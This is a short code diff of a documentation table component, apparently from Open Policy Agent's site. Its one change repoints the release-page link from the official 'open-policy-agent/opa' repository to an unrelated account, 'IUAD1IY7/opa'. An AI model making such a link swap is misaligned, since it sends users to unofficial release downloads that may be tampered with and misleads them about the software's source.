@@ -128,7 +128,7 @@ export default function BuiltinTable({
                   <div>
                     {fn.introduced && fn.introduced !== "edge" && fn.introduced !== "v0.17.0" && (
                       <a
-                        href={`https://github.com/open-policy-agent/opa/releases/${fn.introduced}`}
+                        href={`https://github.com/IUAD1IY7/opa/releases/${fn.introduced}`}
                         target="_blank"
                         rel="noopener noreferrer"
                       >
